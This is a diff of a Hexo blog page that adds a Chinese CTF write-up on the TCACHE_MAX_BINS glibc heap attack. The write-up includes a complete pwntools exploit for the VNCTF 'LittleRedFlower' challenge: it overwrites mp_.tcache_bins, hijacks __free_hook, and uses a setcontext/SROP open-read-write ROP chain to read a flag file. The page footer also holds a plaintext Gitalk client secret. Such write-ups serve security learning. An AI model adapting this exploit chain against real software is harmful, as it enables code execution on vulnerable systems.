@@ -3,7 +3,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>文章归档 - 广莫之野</title>
+  <title>TCACHE_MAX_BINS_attack - 广莫之野</title>
   <meta charset="UTF-8">
   <meta name="description" content>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -11,13 +11,18 @@
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="广莫之野">
-<meta property="og:url" content="http://shiroinu.top/archives/page/3/index.html">
+  <meta name="description" content="一种利用修改tcache最大size限制来攻击的方式 类似global_max_fasttcache的size范围是0x20到0x410,通过修改mp_.tcache_bins可以达成超过该范围的idx仍视作tcache取出的效果.">
+<meta name="keywords" content="ctf,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCACHE_MAX_BINS_attack">
+<meta property="og:url" content="http://shiroinu.top/2021/04/16/TCACHE-MAX-BINS-attack/index.html">
 <meta property="og:site_name" content="广莫之野">
+<meta property="og:description" content="一种利用修改tcache最大size限制来攻击的方式 类似global_max_fasttcache的size范围是0x20到0x410,通过修改mp_.tcache_bins可以达成超过该范围的idx仍视作tcache取出的效果.">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-04-17T01:34:15.118Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="广莫之野">
+<meta name="twitter:title" content="TCACHE_MAX_BINS_attack">
+<meta name="twitter:description" content="一种利用修改tcache最大size限制来攻击的方式 类似global_max_fasttcache的size范围是0x20到0x410,通过修改mp_.tcache_bins可以达成超过该范围的idx仍视作tcache取出的效果.">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
@@ -25,7 +30,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1618623339509">
+  <link rel="stylesheet" href="/css/style.css?v=1618623339189">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -121,112 +126,107 @@
   </div>
   <div id="nexmoe-content">
     <div class="nexmoe-primary">
-        <section class="nexmoe-posts" id="brand-waterfall">
-    
-    <div class="nexmoe-post">
-        <a href="/2019/08/08/add/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                    <img src="/images/back1.png" alt="pwnable.xyz add WriteUP">
-                
-                <h1>pwnable.xyz add WriteUP</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月08日</a>
-            <a><i class="nexmoefont icon-areachart"></i>188 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
-            
-            
-                <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
-            
-        </div>
-        <article>
-            
-            <p>pwnable.xyz 上的add的WriteUP。</p>
-            
-        </article>
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+            <img src="/images/back1.png">
+        
+        <h1>TCACHE_MAX_BINS_attack</h1>
     </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年04月16日</a>
+    <a><i class="nexmoefont icon-areachart"></i>510 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 2 分钟</a>
     
-    <div class="nexmoe-post">
-        <a href="/2019/08/08/sub/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                    <img src="/images/back1.png" alt="pwnable.xyz sub WriteUp">
-                
-                <h1>pwnable.xyz sub WriteUp</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月08日</a>
-            <a><i class="nexmoefont icon-areachart"></i>39 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
-            
-            
-                <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a>
-            
-        </div>
-        <article>
-            
-            <p> pwnable.xyz上的白给题的wp。</p>
-            
-        </article>
-    </div>
     
-    <div class="nexmoe-post">
-        <a href="/2019/08/07/pwnable-xyz-welcome-WriteUp/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                    <img src="/images/back1.png" alt="pwnable.xyz welcome WriteUp">
-                
-                <h1>pwnable.xyz welcome WriteUp</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月07日</a>
-            <a><i class="nexmoefont icon-areachart"></i>222 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
-            
-            
-                <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
-            
-        </div>
-        <article>
-            
-            <p>开始做pwnable.xyz上的题目了，记录下做题的思路。</p>
-            
-        </article>
-    </div>
+      <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
     
-    <div class="nexmoe-post">
-        <a href="/2019/08/03/hello-world/">
-            <div class="nexmoe-post-cover mdui-ripple"> 
-                
-                    <img src="/images/back1.png" alt="Hello World">
-                
-                <h1>Hello World</h1>
-            </div>
-        </a>
-        <div class="nexmoe-post-meta">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月03日</a>
-            <a><i class="nexmoefont icon-areachart"></i>75 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
-            
-            
-        </div>
-        <article>
-            
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-            
-        </article>
-    </div>
-    
-</section>
+  </div>
+  <article>
+    <p>一种利用修改tcache最大size限制来攻击的方式 类似global_max_fast<br>tcache的size范围是0x20到0x410,通过修改<code>mp_.tcache_bins</code>可以达成超过该范围的idx仍视作tcache取出的效果.</p>
+<a id="more"></a>
 
-    <nav class="nexmoe-page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/2/"><i class="nexmoefont icon-left"></i></a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
+<h1 id="VNCTF-LittleRedFlower"><a href="#VNCTF-LittleRedFlower" class="headerlink" title="VNCTF-LittleRedFlower"></a>VNCTF-LittleRedFlower</h1><p>题目首先给了libc地址,然后给了任意地址修改一字节<br>然后给了堆地址上的任意地址写八字节<br>最后给了一个size 0x1000以上的malloc</p>
+<p>根据流程,先修改tcache_bins的高字节,这样堆上远大于原tcache struct的部分全都被视作对于的tcache count和entries<br>题目malloc了一个全为0x1的chunk 将这个始做count,计算偏移,利用写八字节的机会在对应的entries写free_hook地址,将其对应size malloc出来写orw即可</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+context.log_level = &quot;debug&quot;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+context.arch = &#39;amd64&#39;
+sh = process(&#39;./redflower&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+sh.recvuntil(&quot;GIFT: &quot;)
+libc_base = int(sh.recvline(),16) - libc.symbols[&#39;_IO_2_1_stdout_&#39;]
+libc.address = libc_base
+tcache_bins = libc_base + 0x1Eb2D0
+# tcache_ptr_addr = 0x603090 + 8 * ((x - 0x603010) / 2)
+# count对应的entries偏移地址
+log.success(&#39;libc_base = &#39; + hex(libc_base))
+sh.recvuntil(&#39;anywhere&#39;)
+sh.send(p64(tcache_bins + 7))
+sh.recvuntil(&quot;what?&quot;)
+sh.send(&#39;\xff&#39;)
+sh.recvuntil(&quot;Offset:&quot;)
+sh.sendline(str(0x830))
+sh.recvuntil(&#39;Content:&#39;)
+sh.send(p64(libc.symbols[&#39;__free_hook&#39;]))
+
+# size = ((x - 0x603010) / 2) * 0x10 + 0x20 - 0x10
+# 需要malloc的chunksize
+sh.recvuntil(&#39;size:&#39;)
+sh.sendline(str(0x14a0-0x10))
+rdx_gadget = libc_base + 0x0000000000154930
+#0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
+rdi_ret = libc_base + 0x0000000000026b72
+ret = libc_base + 0x0000000000025679
+rsi_ret = libc_base + 0x0000000000027529
+rdx_r12_ret = libc_base + 0x000000000011c371
+rax_ret = libc_base + 0x000000000004a550
+syscall = libc_base + 0x0000000000066229
+free_hook = libc.symbols[&#39;__free_hook&#39;]
+setcontext = libc.symbols[&#39;setcontext&#39;] + 61
+rop_addr = free_hook + 0x200
+
+frame_addr = free_hook + 0x10
+rop = p64(rdi_ret) + p64(frame_addr + 0x1e0) + p64(rsi_ret) + p64(0) + p64(rax_ret) + p64(constants.SYS_open) + p64(syscall)
+rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(free_hook + 0x400) + p64(rdx_r12_ret) + p64(0x30) + p64(0) + p64(libc.symbols[&#39;read&#39;])
+rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(free_hook + 0x400) + p64(rdx_r12_ret) + p64(0x30) + p64(0) + p64(libc.symbols[&#39;write&#39;])
+frame = SigreturnFrame()
+frame.rsp = rop_addr
+frame.rip = ret
+payload = p64(rdx_gadget) + p64(free_hook + 0x10) + p64(0) * 4 + p64(setcontext) + bytes(frame)[0x28:] 
+payload = payload.ljust(0x1f0,b&#39;\x00&#39;)
+payload += b&#39;./flag\x00\x00&#39; + p64(0)
+payload += rop
+gdb.attach(sh)
+sh.send(payload)
+
+sh.interactive()
+
+</code></pre>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.wjhwjhn.com/archives/192/" target="_blank" rel="noopener">glibc 2.27-2.32 版本下 Tcache Struct 的溢出利用</a></p>
+
+  </article>
   
+    
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
     </div>
   </div>
   <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
@@ -242,7 +242,7 @@
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1618623339522"></script>
+<script src="/js/app.js?v=1618623339199"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
